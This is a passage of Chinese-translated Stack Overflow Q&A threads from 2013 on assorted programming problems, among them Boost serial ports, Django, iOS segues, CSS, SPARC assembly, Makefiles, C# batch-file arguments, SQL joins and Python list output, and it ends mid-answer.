当我运行下面的代码时，我收到一条错误消息“打开：访问被拒绝”。我知道这很可能意味着端口已经打开，因此不可用。但是，我可以在 C# 和另一个 C++ 程序中非常轻松地访问 COM 端口，但是我不知道如何在 Boost 中实现它，而且我的搜索效率并不高。

```
void main()
{
try 
{       
    SerialSimple ss("COM12", 115200);       
    //ss.writeString("hi");
}
catch (exception& e)
{
    cout << "Standard exception: " << e.what() << endl;
}

_getch();
} 
```

干杯

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T14:47:52.180

问题可能是您试图为每次读取打开相同的端口，而没有在单独的实例（C# 或此程序）中关闭它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T15:24:23.743

通过断开连接然后重新启动来解决它 - 我正在使用 Tera Term。即使我不知道如何，当我尝试写入它时，它一定是被其他东西打开的。

# django - 应用程序的 django python 包

> ID：15526728
> 
> 赞同：0
> 
> 时间：2013-03-20T14:43:21.260
> 
> 标签：django

我们想在项目目录之外创建 django 应用程序。

我们是否需要通过创建 setup.py 来创建 python 包并将其安装到站点包中？

当应用程序嵌入到项目文件夹中时，这是如何工作的？（我在任何地方都没有看到 setup.py）。

我想我不明白什么时候做一个包裹，什么时候不做。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T16:40:34.930

要仅包含来自外部位置的应用程序，我通常使用以下内容：

```
main
  -__init__.py
  -manage.py
  -urls.py
  -settings.py
  -foo
    -__init__.py
    -models.py
    -views.py
    -admin.py

external
  -__init__.py
  -bar
    -__init__.py
    -models.py
    -views.py
    -admin.py 
```

假设我们要包括`external.bar`在 django 项目中包含一个应用程序`main`。

首先确保在`settings.py`of 中`main` `external`是 on`sys.path`以便 python 可以找到它：

```
import sys
sys.path.append("/path/to/external") 
```

然后只需添加`external.bar`到已安装的应用程序：

```
INSTALLED_APPS = (
    'django.stuff',
    'main.foo',
    'external.bar',
) 
```

然后`admin.auto_discover()`应该找到您的`external.bar`应用程序并为其加载管理员。

# cocoa-touch - 通过“返回”按钮在 UINavigationController pop 上使用自定义 segue 放松

> ID：15526730
> 
> 赞同：6
> 
> 时间：2013-03-20T14:43:21.937
> 
> 标签：cocoa-touch, ios6, uistoryboard, uistoryboardsegue

简单的故事板设置：带有 UINavigationController 的 UIViewController。在表格单元格上单击自定义 segue 将新的 UIViewController 推送到导航堆栈上。都好。但是在导航栏中按下“返回”按钮，它只使用默认的弹出动画。

我如何告诉导航控制器在弹出时使用我的自定义 segue？我已经添加

```
- (UIStoryboardSegue *)segueForUnwindingToViewController:(UIViewController *)toViewController fromViewController:(UIViewController *)fromViewController identifier:(NSString *)identifier

- (BOOL)canPerformUnwindSegueAction:(SEL)action fromViewController:(UIViewController *)fromViewController withSender:(id)sender 
```

到两个视图控制器，但它们根本没有被调用。

我错过了什么？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2014-06-06T13:58:27.827

您可以通过创建自定义转换而不是使用自定义转场来完成此操作。我花了一段时间才明白，但基本上很简单。只需确保您的第一个视图控制器采用 UINavigationControllerDelegate 协议。然后，仍然在第一个视图控制器中，实现以下方法：

```
- (id<UIViewControllerAnimatedTransitioning>)navigationController:(UINavigationController *)navigationController
                              animationControllerForOperation:(UINavigationControllerOperation)operation
                                           fromViewController:(UIViewController *)fromVC
                                             toViewController:(UIViewController *)toVC
{
return X // where X is an animation Controller object, an instance of the animator class.  
} 
```

仍然在第一个视图控制器中，例如在 ViewDidLoad 中，告诉导航控制器第一个视图控制器将充当其委托：

```
self.navigationController.delegate = self; 
```

最后但同样重要的是，创建一个采用 UIViewControllerAnimatedTransitioning 协议的动画器类。实现以下方法：

```
- (void)animateTransition:(id<UIViewControllerContextTransitioning>)transitionContext 
```

和

```
- (NSTimeInterval)transitionDuration:(id<UIViewControllerContextTransitioning>)transitionContext 
```

第一种方法保存转换代码。当点击后退按钮时，将自动使用此转换代码。

这是一个非常简单的[示例项目](https://github.com/Tuslareb/jvbcustomnavtransition "带有自定义淡入淡出过渡的 UINavigationController")。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-22T16:39:32.740

展开转场对于“回滚”转场很有用，包括自定义转场。您的用例中的问题不在于 segue 本身，而在于您想从后退按钮触发 unwind segue。

这就是说，您可以尝试通过不使用展开来解决此问题，但在点击标准后退按钮时触发自定义转场：

```
// MyDetailViewController.m:
- (void)viewWillDisappear:(BOOL)animated
{
    if ([self.navigationController.viewControllers indexOfObject:self] == NSNotFound) {
        // trigger custom segue (but note that the sourceViewController
        // has already been removed from the nav controller)
    }
    [super viewWillDisappear:animated];
} 
```

显然，这不再与展开无关——它只是执行一个自定义的转场，您实现该转场以“回滚”您最初用来“推动”细节视图控制器的转场。

让我知道这是怎么回事。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-03-20T17:04:34.147

您是否尝试过使用类似的东西：

```
- (UIStoryboardSegue *)segueForUnwindingToViewController:(UIViewController *)toViewController fromViewController:(UIViewController *)fromViewController identifier:(NSString *)identifier
{
    return [MyCustomSegueInitMethod viewControllerA:vc1 viewControllerB: vcB];
} 
```

我从来没有做过自定义segue，但是假设它们在覆盖它们时像所有其他人一样工作，只要您的自定义segue类是UIStoryBoardSegue的子类，它应该可以工作......

然后确保您已将后退按钮链接到视图控制器下方栏中的“退出”图标。

# python - TypeError：ModelBase 对象为关键字参数获取了多个值

> ID：15526733
> 
> 赞同：1
> 
> 时间：2013-03-20T14:43:27.447
> 
> 标签：python, django, unit-testing

我得到一个

> TypeError：ModelBase 对象为关键字参数“日期”获取了多个值

当我尝试创建一个“城市”时，在我的测试框架上。

* * *

这是我的回溯：

```
ERROR: test_create_city (app.tests.AppManagementTestCase)
----------------------------------------------------------------------
Traceback (most recent call last):
  File "..tests.py", line 158, in test_create_city
    city_obj = City(user = self.user, category = c, date = datetime.datetime.now(), **data)
TypeError: ModelBase object got multiple values for keyword argument 'date' 
```

和我的代码：

```
def test_create_city(self):
c = Category(name=self.categories[0]['name'])
c.save()
data = {'vehiclesound': '/assets/sounds/vehicle.ogg', 'vehicleshadow': '', 'maxspeed': 160.0, 'suspensionrestlength': 0.5, 'category': 12L, 'leftpub': '8294092164', 'wheelmodelzscale': 0.7, 'camheight': 2.1, 'speedminturn': 50.0, 'suspensiondeltatime': 0.25, 'crashsound': '/assets/sounds/crash.ogg', 'decel': 40.0, 'camtilt': 90.0, 'turnspeedmin': 20.0, 'path': 'just_testing_path', 'frontrightwheel': '', 'limitlinealpha': '01', 'open': 1, 'id': 35L, 'limitheight': 700L, 'modelzscale': 0.7, 'model_complete': 'http://youbeq.org/models/get.php?file=default_app/model.dae', 'rearleftwheel': '', 'user_id': 1L, 'wheelmodelyscale': 0.7, 'allwheels': 'http://sketchup.google.com/3dwarehouse/download?mid=4bc3b6056f5cd97eb5d8f6f0e9fb0ac&rtyp=ks&fn=taxi_4tires&ctyp=other&prevstart=0&ts=1343322996000', 'limitlinecolor': 'FFFFFF', 'limitcolor': '00ffff', 'gravity': 70.0, 'modelxscale': 0.7, 'limitlinewidth': 2L, 'kms': 9007.25, 'axisdistance': 2.5, 'minaccelstep': 5.0, 'wheelsdistance': 1.0, 'limitalpha': '70', 'turnspeedmax': 60.0, 'traildistance': 10.0, 'suspensionstiffness': 0.5, 'vehicletype': 'car', 'description': 'The City that never sleeps', 'wheelsheight': 0.37, 'vehiclesoundtime': 150.0, 'rollclamp': 50.0, 'accel': 5.0, 'backgroundsoundtime': 150.0, 'wheelmodelxscale': 0.7, 'rightpub': '5607834847', 'key': 'just_testing_key', 'accelstep': 25.0, 'date': None, 'world': 'earth', 'mapiconurl': '', 'vehicleagility': 0.0005, 'footer_large': '/assets/img/new_york.png', 'modelheight': 0.0, 'frontleftwheel': '', 'speedmaxturn': 5.0, 'name': 'New York', 'footer': '/taxi/assets/img/taxi_smarturbia_image_new_york.png', 'suspensiondamping': -0.15, 'rearrightwheel': '', 'crashsoundtime': 150.0, 'vehiclefastsoundtime': 150.0, 'maxrevspeed': 15.0, 'mass': 3000.0, 'backgroundsound': '/assets/sounds/background.ogg', 'published': 1, 'modelyscale': 0.7, 'model': 'http://sketchup.google.com/3dwarehouse/download?mid=128bf1862f1eb56db5d8f6f0e9fb0ac&rtyp=ks&fn=taxi_new_york_chassi&ctyp=other&prevstart=12&ts=1343297355000', 'vehiclefastsound': '', 'rollspring': 0.5, 'steerroll': -1.0}
        print self.user
        try :
            city_obj = City.objects.get(key=self.categories[0]['name'])
            print ("city_already_exists")
        except City.DoesNotExist:
            print ("debug")
            city_obj = City(user = self.user, category = c, date = datetime.datetime.now(), **data)
            city_obj.save() 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-20T14:56:48.190

您的`data`字典包含`'date': None`，因此正如错误所说，您将 date 传递了两次，因为您还在关键字参数中显式地传递了它。

你可能想做这样的事情：

```
new_data = {'user': self.user, 'category': c, 'date': datetime.datetime.now()}
data.update(new_data)
city_obj = City(**data) 
```

（注意这会修改`data`字典，如果你不想要，那么你应该先复制它。）

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-20T14:56:26.340

在 Python 中，您可以传递一个哈希值并`**`使用它来代替关键字参数。考虑这个例子：

```
>>> def fun(x, y):
...   pass
... 
>>> hash = {'x': 1, 'y': 2}
>>> fun(**hash) # OK
>>> fun(x=3, **hash) # x defined both explicitly and in hash
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
TypeError: fun() got multiple values for keyword argument 'x' 
```

在您的情况下，`City`构造函数使用`date`了两次：您`'date': None`在`data`哈希中并显式传递给`City`with `date = datetime.datetime.now()`。

要修复此代码，您应该`date`从`data`哈希中删除，这样它就不会与显式参数冲突。

# css - 使用 DIV 和 CSS 填充我们剩余的屏幕

> ID：15526737
> 
> 赞同：-1
> 
> 时间：2013-03-20T14:43:37.590
> 
> 标签：css, html

我正在研究一个带有页眉（固定高度）、内容和页脚（固定高度）的简单布局。到目前为止，只要文本内容没有填满整个屏幕，我就可以让它正常工作。

[请参阅代码示例](http://jsfiddle.net/Hx7U7/290)。

```
<!-- CSS code -->
<style>
#col1, #col2, #col3, #col4, #col5, #col6 {width: 40% }
#col4, #col5, #col6 {left: 50% }
#col1, #col4 {
    position: absolute;
    top: 0px;
    height: 100px;
    background-color: red;
}
#col2, #col5 {
    position: absolute;  
    top: 100px;
    bottom: 50px; 
    background-color: yellow;
}
#col3, #col6 {  
    position: absolute;  
    bottom: 0px;
    height:50px;
    background-color: green;
}
</style>

<!-- DIV code -->

<div id="wrapper1">
<div id='col1'>Short text</div>
<div id='col2'>Content<br>Lorem ipsum dolor sit amet, accusamus intellegat mea ad,     assum invidunt persequeris nam no. Iisque eloquentiam et sea, cum an mazim viris     democritum. Tation fabulas argumentum ei duo. Cu sea facer commodo eripuit, et munere omnium timeam his. At saepe complectitur cum, in pri illud lorem doctus. An cum tamquam scaevola, sit ut choro nominavi scripserit.</div>
<div id='col3'>Footer</div>
</div>
<div id="wrapper2">
<div id='col4'>Long text</div>
<div id='col5'>Content<br>Lorem ipsum dolor sit amet, accusamus intellegat mea ad, assum invidunt persequeris nam no. Iisque eloquentiam et sea, cum an mazim viris democritum. Tation fabulas argumentum ei duo. Cu sea facer commodo eripuit, et munere omnium timeam his. At saepe complectitur cum, in pri illud lorem doctus. An cum tamquam scaevola, sit ut choro nominavi scripserit. Te accusamus efficiendi vis, tollit ocurreret ea mei, vis aliquando necessitatibus id. Porro lucilius pri at. Esse invidunt at his, mea quas error te, eu option constituto vim. Wisi primis in his, ea vis errem quaestio ocurreret, ex vel dicunt ullamcorper. Ut possim corpora omittantur nam. Oblique sapientem qui ex. Mei ea solet vitae fabellas. Id diceret delicatissimi pri, sit ut viris equidem oportere. Id nec simul zril urbanitas, ne clita consul usu. Ei est ridens ancillae sensibus, pro etiam mandamus inciderint ne. Eam ceteros omnesque in, quo animal laboramus elaboraret at. Nam adhuc consul at, fugit animal oporteat ut vim, vix u iuvaret invidunt deserunt. Mei an adhuc deleniti imperdiet, cu admodum persecuti efficiantur has. Autem labore concludaturque ut vix, discere consulatu hendrerit id nec, voluptua reformidans vis ne. Vidit aliquam eam ad, vocibus invidunt facilisis ea qui, elit posse fastidii cu vel. Eos ei natum propriae epicurei. Eos virtute verterem voluptaria ne, te sint iudicabit mel, ei nec adipiscing liberavisse. Ei dolorem omittam pro, eum at minim impedit scribentur, fierent efficiendi no eam. Vim dicat vulputate no, ei nec vidisse posidonium, at cum menandri iracundia. Vim at epicurei pertinax, an has elit iisque. Has ei legere percipit scriptorem, nam ne recusabo salutandi scripserit, ne usu tota decore voluptatum.</div>
<div id='col6'>Footer</div>
</div> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T14:58:53.767

将**中间列**的位置更改为“底部：-9999px”，以便它们延伸到可视区域下方，然后将**底部列**定位为“固定”，以便内容可以在下方滑动

```
#col2, #col5 {
    position: absolute;  
    top: 100px;
    bottom: -9999px; 
    background-color: yellow;
}
#col3, #col6 {  
    position: fixed;  
    bottom: 0px;
    height:50px;
    background-color: green;
} 
```

# python - 如何调查 python unittest load_tests 方法中的错误？

> ID：15526741
> 
> 赞同：2
> 
> 时间：2013-03-20T14:43:46.300
> 
> 标签：python, unit-testing, python-2.7

Python unittest 有一个方法[load_tests](http://docs.python.org/2/library/unittest.html#load-tests-protocol)，理论上可以在模块内部使用它来定义要加载的测试。我试图从字面上使用“什么都不做”的例子：

```
def load_tests(loader, standard_tests, pattern):
    # top level directory cached on loader instance
    this_dir = os.path.dirname(__file__)
    package_tests = loader.discover(start_dir=this_dir, pattern=pattern)
    standard_tests.addTests(package_tests)
    return standard_tests 
```

并得到一个错误：

```
ERROR: LoadTestsFailure test_example 
```

如果没有`load_tests`在我的模块中正确指定测试功能。我怎样才能找出我遇到的问题？

更多信息：`this_dir`是一个有效的路径，`loader`是一个 `<unittest.loader.TestLoader`` object and`模式`是空的。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T14:50:52.890

如果您使用的是像 PyDev 这样的 ide，您可以添加一个断点，或者您可以添加一个 try/except 块：

```
def load_tests(loader, standard_tests, pattern):
    # top level directory cached on loader instance
try:
    this_dir = os.path.dirname(__file__)
    package_tests = loader.discover(start_dir=this_dir, pattern=pattern)
    standard_tests.addTests(package_tests)
except Exception as e:
    print 'Error loading tests: %s' % str(e)
return standard_tests 
```

# sql-server-2008 - 我需要在 SQL 实例和 DBR 上安装 SSRS 还是只在 DBR 上安装？

> ID：15526747
> 
> 赞同：0
> 
> 时间：2013-03-20T14:43:58.837
> 
> 标签：sql-server-2008, sharepoint, reporting-services, cluster-computing

所以这里是场景......

我有以下服务器

1.  WFE
2.  SP 应用服务器
3.  DBR（我想运行我们的报告，已经安装了 SQL 报告服务）
4.  SQL（集群环境中的实例）2008 R2

SharePoint 与 SSRS 加载项一起安装在机器 1-3 上，我正在尝试在机器 3 上安装和配置报告服务。当我尝试连接到我们的 DBA 创建的报告数据库时，我发现我无法访问 SQL节点集群 (xyzSQLbox\instanceNode)。

简而言之，我是否需要在机器 4 上安装报告服务才能使用机器 3 上的 SSRS 访问它，还是我错过了一些步骤？另外，这种配置甚至可能吗？

帮我堆栈溢出你我唯一的希望！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T01:00:00.423

您不需要在 SQL 后端安装 SSRS。如果您无法连接到可能指向防火墙或安全问题的 SQL。

# c++ - 如何使服务器和客户端在任何机器上运行

> ID：15526753
> 
> 赞同：0
> 
> 时间：2013-03-20T14:44:03.700
> 
> 标签：c++, tcp, udp, client-server, broadcast

我用 C++ 创建了一个客户端服务器程序。但我的问题是，如果服务器在某台计算机上，客户端只能连接到服务器，因为客户端必须知道服务器的 IP 地址才能使用以下代码进行连接：

```
ServerAddr.sin_addr.s_addr = inet_addr("10.13.32.112"); 
```

所以我的问题是如何让客户端自动找到服务器，而无需每次都更改代码中的 IP 地址？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-21T09:17:39.177

*从我的评论：*

为什么不使用主机名？

主机名是人类友好的名称，指的是一台或多台计算机。这方面的一个例子是互联网上的域名——我不需要输入堆栈溢出的 IP 地址，我只需输入 stackoverflow.com。

在您的情况下，您可以设置一个域名以指向您尝试连接的服务器，然后将该主机名解析为 C++ 代码中的 IP 地址。

# assembly - 汇编中的 cmp 和 subcc/others

> ID：15526754
> 
> 赞同：1
> 
> 时间：2013-03-20T14:44:08.860
> 
> 标签：assembly, sparc

SPARC 程序集有一个`cmp`指令，它比较两个数字（如果我理解正确的话，使用减法）。它也有`subcc`, `addcc`, `andcc`, 和其他。`cmp`执行计算后使用和设置条件代码比较两个数字有什么区别？我很难围绕这个概念来思考。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T14:49:56.080

> 使用 cmp 比较两个数字和在执行计算后设置条件代码有什么区别？

**通常（例如在 x86 或 68000 类型的处理器上）**，`cmp`只设置状态标志，而不修改操作数或将结果存储在任何地方。

`sub`等也正在更改目标操作数（它们需要将结果存储在某处），这在进行比较操作时不是必需的。

本质上，`cmp`是一种`sub`简单地丢弃结果的操作（可能会节省指令周期）。比较时，不需要结果，只需要知道结果是否为零，是否为负。

**特别是在 SPARC 上，**提供`cmp`了一条“综合指令”，以提高可读性，最终由汇编程序转换为`subcc`指令。[请参阅http://moss.csc.ncsu.edu/~mueller/codeopt/codeopt00/notes/sparc.html](http://moss.csc.ncsu.edu/~mueller/codeopt/codeopt00/notes/sparc.html)上的“综合说明” 。

因此，由汇编程序`cmp %reg1,%reg2`转换为。`subcc %reg1,%reg2,%g0`这会减去两个寄存器，并通过将结果存储到寄存器中来有效地丢弃结果`%g0`。`%g0`是一个寄存器，`0`读取时总是返回，写入时不会改变。`cmp`因此，在指令级别上，和之间根本没有区别`subcc`（换句话说，SPARC 没有单独的`cmp`指令，而是使用`subcc`特殊的目标寄存器进行比较）。

# makefile - Makefile 和头文件定义选项的共存

> ID：15526760
> 
> 赞同：1
> 
> 时间：2013-03-20T14:44:27.647
> 
> 标签：makefile, preprocessor-directive

我在一个 FORTRAN 代码项目中工作，其中编译决策在两个文件中进行：一个头文件 ( `definitions.h`)，它包含在相关的 FORTRAN 文件中，以及`makefile`. 例如，编译器、一些库集和允许的并行化类型（MPI、OpenMP 或无）在 中选择`makefile`，并且代码的某些部分的包含由`#define`标头中的指令控制。

1.  我不喜欢编辑两个不同的文件来设置编译。有更好的方法吗？

2.  此外，`makefile`和`definitions.h`文件都处于修订控制之下。这意味着我那些粗心的开发人员提交并推送了两个文件的新版本，他们只更改了启用的编译选项，因此污染了版本控制历史。理想情况下，至少`makefile`不必编辑最大的文件（ ）来设置编译选项。

3.  在某些情况下，会发生不一致。通常，在 中选择的某些库组合与指令`makefile`选择的某些代码部分不兼容`#define`。有什么方法可以正确检查吗？

    例如，为了停止编译如果`LIB1=LIBFOO`（在 中`makefile`）并且`bar`被定义为`1`（在头文件中），我在`makefile`

    ```
    ifeq ($(LIB1), LIBFOO)
        bar_status:=`grep -i '^[[:space:]]*\#define[[:space:]]*bar[[:space:]]*[[:digit:]]' definitions.h | tail -n1 | grep -ic '^[[:space:]]*#define[[:space:]]*bar[[:space:]]*1[[:space:]]*'`
    ifeq ($(bar_status), 1)
        $(error ERROR: You are trying to compile the code with bar enabled in definitions.h, but this is incompatible with the library LIBFOO selected in the makefile)
    endif
    endif 
    ```

    但是（a）这非常丑陋，并且（b）显然它根本不起作用。如何解决这个问题？

* * *

我在 3\. 上工作，我想我有一个答案：我添加了一个新`.PHONY`目标 ，`ini_check`这是其他相关目标的必要条件，并读取

```
ifeq ($(LIB1), LIBFOO)
    bar_value:=$(shell echo bar | cat definitions.h - | gcc -E -undef - 2>/dev/null | tail -n1)
endif

ini_check:
ifeq ($(LIB1), LIBFOO)
ifeq ($(bar_value), 1)
    $(error ERROR: You are trying to compile the code with bar enabled in definitions.h, but this is incompatible with the library LIBFOO selected in the makefile)
endif
endif
    @echo "Done with the initial check, starting compilation..." 
```

`bar`请注意，现在我使用 C 预处理器在解析标头后获取变量的值。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T19:29:50.507

如果您的策略是在不带标志或参数的情况下运行 Make，您仍然可以通过将相关开关放在 makefile 将执行的附加文件（*不受*版本控制）中来省去一些麻烦`include`。

正如您所说，使用 Make 解析源文件既丑陋又困难。维护是一场噩梦。我建议将两个版本的`definitions.h`版本控制在不同的目录中；选择库的相同Make逻辑可以选择头文件。

我不知道当你的头文件与库“不兼容”时你会遇到什么样的错误，但如果库有不同的接口，你可能可以通过放入一些特定于库的调用来故意调用编译器错误头文件。（如果他们没有不同的接口，你似乎有一些糟糕的依赖于实现的行为。）

最后，如果“几分钟”对于等待这样的编译器错误来说太长了，那么你肯定经常犯这样的错误——你可能想看看你的程序。（此外，如果您只修改了一个或两个文件，那么构建不应该花费那么长时间 - 是的，每天构建，但不是您每小时执行几次的那种。）

# ruby-on-rails-3 - 使用自定义函数将值从 Rails 传递到 SASS

> ID：15526761
> 
> 赞同：1
> 
> 时间：2013-03-20T14:44:35.313
> 
> 标签：ruby-on-rails-3, sass

我试图在编译期间将一些值从 Rails (3.2.12) 传递到 SASS (3.2.7) 文件。我尝试关注[SASS 文档](http://sass-lang.com/docs/yardoc/file.SASS_REFERENCE.html#defining_custom_sass_functions)和其他一些关于 SO的[答案。](http://sass-lang.com/docs/yardoc/file.SASS_REFERENCE.html#defining_custom_sass_functions)看起来它应该很简单，但我还没有设法克服这个错误：

```
undefined method `gsub' for nil:NilClass
  (in /home/joegatt/Sites/joegatt.net/v3/joegattnet_v3/app/assets/stylesheets/application.css.sass) 
```

我的设置是：

```
#/config/application.rb
if config.respond_to?(:sass)
  require "#{config.root}/lib/sass.rb"
end

#/lib/sass.rb
module Sass::Script::Functions
  def styling(string, opts = {} )
    assert_type string, :String
    Sass::Script::String.new( '#ff0000' )
  end
  declare :styling, :args => [:string]
end

#/assets/stylesheets/default.css.scss
background-color: styling('test') 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-06-25T08:24:05.240

我已经设法通过执行以下操作使其工作：

```
#/lib/sass.rb
module Sass::Script::Functions
  def settings_styling(setting)
    assert_type setting, :String
    Sass::Script::Parser.parse('#ff0000', 0, 0)
  end
  declare :settings_styling, args: [:setting]
end 
```

不同之处在于，我没有使用 Sass::Script::String.new，而是使用 Sass::Script::Parser.parse，以便返回“ [Script::Nodes 树](http://sass-lang.com/docs/yardoc/Sass/Script/Parser.html)”而不是字符串。有更好的想法吗？

# c# - 如何将 C# 字符串变量从 Windows 窗体传递给 .BAT 文件

> ID：15526763
> 
> 赞同：2
> 
> 时间：2013-03-20T14:44:36.200
> 
> 标签：c#, .net, string, forms, batch-file

我想提前道歉，因为这个问题可能已经在其他地方得到了回答（找不到具体答案）。我进行了广泛的搜索，这让我越来越困惑。在这一点上，我想我可以轻松快速地回答我的具体问题/困境。

我有一个 C# Windows 窗体应用程序。我正在使用文本框和按钮进行测试。我希望用户在文本框中输入一个 3 位数字，然后单击按钮将 3 位用户输入保存为字符串值，然后启动一个预先确定的 .BAT 文件。然后我想让我的 .BAT 文件执行输入 GOTO*字符串。*这是我到目前为止所拥有的：

```
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace ComboBoxAndButton
{
    public partial class Form1 : Form
    {
    public Form1()
    {
        InitializeComponent();
        this.textBox1.KeyPress += new KeyPressEventHandler(textBox1_KeyPress);
    }
    private void textBox1_KeyPress(object sender, KeyPressEventArgs e)
     {
        e.Handled = !char.IsDigit(e.KeyChar);
     }

    public string opconumber;

    private void textBox1_TextChanged(object sender, EventArgs e)
    {
      opconumber = textBox1.Text;
    }

    private void button1_Click(object sender, EventArgs e)
    {
      Start();
    }

   private void Start() 
   {
       System.Diagnostics.Process proc = new System.Diagnostics.Process();
       proc.StartInfo.FileName = @"C:\mybat.bat";
//I am guessing that i need my string inserted somewhere in here.
       proc.StartInfo.RedirectStandardError = false;
       proc.StartInfo.RedirectStandardOutput = false;
       proc.StartInfo.UseShellExecute = false;
       proc.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
       proc.EnableRaisingEvents = true;
       proc.Start();
       proc.WaitForExit();
       this.Close();
   }  
   }
} 
```

我遇到的另一件事是让退格键工作。我尝试了几个不同的片段，但无法正确处理。任何指示或批评都是公开接受的。提前致谢！

编辑：

好的。我有一个批处理文件，我想跳到一个特定的标签。我希望我保存的字符串变量充当 bat 文件中执行的决定因素。这是一个例子：

```
@echo off 
:111 ECHO Argument 111 
goto end 
:112 ECHO Argument 112 
goto end 
:end 
pause 
```

如何在启动蝙蝠时使用字符串“112”让蝙蝠从 :112 开始？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-20T14:47:01.320

```
proc.StartInfo.Arguments = " my arguments"; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-20T14:51:41.737

将其添加为参数：

```
 proc.StartInfo.Arguments = opconumber ; 
```

在 bat 文件中，您可以通过 %1 获取此文件。

哎呀太慢了...

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-20T17:09:19.560

在批处理中，您可以使用`shift`命令访问超过 9 个参数：

```
@echo off &setlocal
:start
echo %~1
shift /1
if "%~1" neq "" goto :start

endlocal 
```

# sql - SQL一次查询多表

> ID：15526766
> 
> 赞同：1
> 
> 时间：2013-03-20T14:44:48.473
> 
> 标签：sql, sql-server, sql-server-2008

我目前正在尝试创建一个查询，以便我可以输出存储在我的数据库中的波段的完整详细信息。我的数据库中目前有 5 个表，它们是`bands`、`gigs`、`members`和。我想要做的是将每个表中的所有数据链接到 URL 变量中提供的相应波段。例如：`comments``tracks`

```
<cfquery datasource="#application.datasource#" name="get-details">
    Select *
    From bands, gigs, members, comments, tracks
    Where gig_bandid = URL.id and member_bandid = URL.id and comments_bandid = URL.id and track_bandid = URL.id
</cfquery> 
```

我想这样做是因为目前，我有 4 个单独的查询检查四个表中的每一个，以查看它们是否包含与 URL 中提供的带 id 匹配的任何数据。我遇到的问题是我想在一个查询中输出所有内容，使用诸如 之类的术语`member_name`，而不是必须使用`get-members.member_name`. 我试过使用`JOIN`但无济于事。我假设只能使用两个表。如果需要，可以提供额外的细节。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-20T14:49:07.307

您当然可以使用 JOIN - 如果数据在一个表中而不在另一个表中，您可能需要 OUTER JOIN。

```
SELECT *
FROM bands b
   JOIN gigs g on b.bandid = g.bandid
   JOIN members m on b.bandid = m.bandid
   JOIN comments c on b.bandid = c.bandid
   JOIN tracks t on b.bandid = t.bandid
WHERE b.bandid = URL.id 
```

或者，如果您知道数据在您的乐队表中但可能不在您的其他表中，则可以使用 LEFT OUTER JOIN：

```
SELECT *
FROM bands b
   LEFT JOIN gigs g on b.bandid = g.bandid
   LEFT JOIN members m on b.bandid = m.bandid
   LEFT JOIN comments c on b.bandid = c.bandid
   LEFT JOIN tracks t on b.bandid = t.bandid
WHERE b.bandid = URL.id 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-20T14:55:24.137

我认为您使用 JOIN 语句朝着正确的方向前进。

但是，要一次加入 5 个表，您必须提供一些匹配条件，以便能够“加入”所有这些表。

该声明将与此类似：

```
SELECT *
FROM bands    AS b
    JOIN gigs     AS g ON g.bandid = b.bandid
    JOIN members  AS m ON m.bandid = b.bandid
    JOIN comments AS c ON c.bandid = b.bandid
    JOIN tracks   AS t ON t.bandid = b.bandid
WHERE b.bandid = URL.id 
```

加入的标准是出现在所有 5 个表中的 bandid（并且是 URL.id）**。**

如上面的答案所述，您可以使用 JOIN 的 INNER 和 OUTER 版本。这是一篇解释差异的文章：[http ://www.wellho.net/mouth/158_MySQL-LEFT-JOIN-and-RIGHT-JOIN-INNER-JOIN-and-OUTER-JOIN.html](http://www.wellho.net/mouth/158_MySQL-LEFT-JOIN-and-RIGHT-JOIN-INNER-JOIN-and-OUTER-JOIN.html)

# c# - 查询时间并写入标签

> ID：15526771
> 
> 赞同：-1
> 
> 时间：2013-03-20T14:45:03.037
> 
> 标签：c#, .net, gtk, monodevelop

查询时间并写入标签。

如何查询时间并写入标签。在 Windows 中很容易：

```
Label1.Text = DateTime.Now.ToShortTimeString(); 
```

在 MonoDevelop 中如何做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T14:46:11.033

根据您正在构建的应用程序类型，它应该以完全相同的方式完成。

# python - 在python中为列表创建第二行并将列表写入txt文件

> ID：15526772
> 
> 赞同：1
> 
> 时间：2013-03-20T14:45:05.917
> 
> 标签：python, list, io, row

我有一个代码，它在某个阶段具有以下行：

```
n_brace.extend([numEL, valueLX[j],valueB[jj], el[2]]) 
```

此行包含在 for 循环中，因此它产生例如：

```
n_brace:
[367, '62', '141', '142', 369, '124', '156', '155', 379, '344', '266', '265', 381, '313', '251', '252'] 
```

但是我希望它改为：

```
n_brace:
[[367, '62', '141', '142'], [369, '124', '156', '155'], [379, '344', '266', '265'], [381, '313', '251', '252']] 
```

在程序结束时，我打开一个文件并想要写入`n_brace`它：

```
fbrace = open("C:/Abaqus_JOBS/brace.txt", 'w')
fbrace.write(n_brace) 
```

我希望结果是：

```
367, 62, 141, 142
369, 124, 156, 155
379, 344, 266, 265
381, 313, 251, 252 
```

但我收到以下错误：

```
TypeError: expected a character buffer object 
```

有任何想法吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-20T14:45:51.550

更改`extend()`为`append()`：

```
n_brace.append([numEL, valueLX[j],valueB[jj], el[2]]) 
```

至于写作（假设 Python 2.x）：

```
